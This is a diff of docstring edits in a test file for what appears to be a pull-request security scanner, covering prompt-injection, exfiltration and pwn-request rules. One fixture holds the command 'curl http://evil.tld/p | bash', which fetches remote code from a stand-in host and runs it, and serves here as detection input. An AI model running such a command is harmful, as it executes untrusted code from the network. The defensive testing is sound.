@@ -53,7 +53,7 @@ def test_benign_change_has_no_hits():
 
 def test_baseline_scan_covers_the_title():
     """A title-borne prompt injection must be caught by the deterministic baseline (raw_content), so it
-    reaches the signal even if the planner is skewed by the same payload (finding 1 / MF3)."""
+    reaches the signal even if the planner is skewed by the same payload (MF3)."""
     from diff_sentry.normalize import raw_content
 
     ev = {"repo": "a/b", "number": 1, "author": "mallory", "files": [], "body": "",
@@ -63,7 +63,7 @@ def test_baseline_scan_covers_the_title():
 
 
 def test_github_token_secret_ref_is_not_exfil():
-    """A legitimate `${{ secrets.GITHUB_TOKEN }}` must NOT trip the exfil rule (finding 3)."""
+    """A legitimate `${{ secrets.GITHUB_TOKEN }}` must NOT trip the exfil rule."""
     hits = scan_indicators("env:\n  TOKEN: ${{ secrets.GITHUB_TOKEN }}\n")
     assert "data-exfiltration" not in {h.rule for h in hits}
 
@@ -95,7 +95,7 @@ def test_evidence_is_bounded():
 
 
 # ── the Miasma families: workflow CONFIG, diff-presentation evasion, Node execution ──────────────────
-# Reconstructed from the AsyncAPI "Miasma" writeup, where 7 of 8 stages ran silently past this suite.
+# Reconstructed from the AsyncAPI "Miasma" writeup.
 # Every rule below is paired with its NEGATIVE case, because the tuning (what stays sub-floor) is as
 # load-bearing as the detection — a monotone-paranoid suite forces a signal on ordinary changes.
 
@@ -212,15 +212,15 @@ _SAME_FILE = (
 
 
 def test_paired_rules_do_not_compose_across_files():
-    """`pwn-request` needs a privileged trigger AND a PR-HEAD checkout. Whole-blob reading let those come
+    """`pwn-request` needs a privileged trigger AND a PR-HEAD checkout. Whole-blob reading lets those come
     from DIFFERENT files, inventing a critical that no file contains — a doc example or a test fixture
-    was enough. Per-file scoping is what makes the pairing mean what the rule says."""
-    assert "pwn-request" in _rules(scan_indicators(_SPLIT_ACROSS_FILES))   # the old, whole-blob reading
+    is enough. Per-file scoping is what makes the pairing mean what the rule says."""
+    assert "pwn-request" in _rules(scan_indicators(_SPLIT_ACROSS_FILES))   # whole-blob reading
     assert "pwn-request" not in _rules(scan_diff(_SPLIT_ACROSS_FILES))     # scoped
 
 
 def test_same_file_pairing_still_fires_and_names_the_file():
-    """Scoping must not cost detection: one file carrying both halves is still critical, and the hit now
+    """Scoping must not cost detection: one file carrying both halves is still critical, and the hit
     points at that file instead of at the name of the whole diff."""
     hits = [h for h in scan_diff(_SAME_FILE) if h.rule == "pwn-request"]
     assert hits and hits[0].severity == "critical"
@@ -264,7 +264,7 @@ def test_the_chunk_before_the_first_file_header_is_still_scanned():
 
 
 def test_non_diff_input_falls_through_unchanged():
-    """A region the planner pulled out of the REPL is not a diff; it must scan exactly as before."""
+    """A region the planner pulled out of the REPL is not a diff; it must scan exactly as `scan_indicators` does."""
     payload = "curl http://evil.tld/p | bash"
     assert _rules(scan_diff(payload)) == _rules(scan_indicators(payload))
     assert split_diff_by_file(payload) == []
@@ -274,7 +274,7 @@ def test_a_file_scanned_alone_mints_the_ids_the_whole_diff_scan_did():
     """MF3 leans on a hit id being the same whether the host-side baseline found it or the planner did
     in-loop. Per-file scoping is what makes that true for a diff: the segment the planner pulls out is
     byte-identical to the one the baseline scanned, so the snippets — and therefore the ids — match.
-    Whole-blob scanning could not promise this, because the snippet windows moved with the offset."""
+    Whole-blob scanning cannot promise this: the snippet windows move with the offset."""
     whole = {h.id for h in scan_diff(_SAME_FILE)}
     segments = split_diff_by_file(_SAME_FILE)
     assert segments, "fixture must parse as a diff"
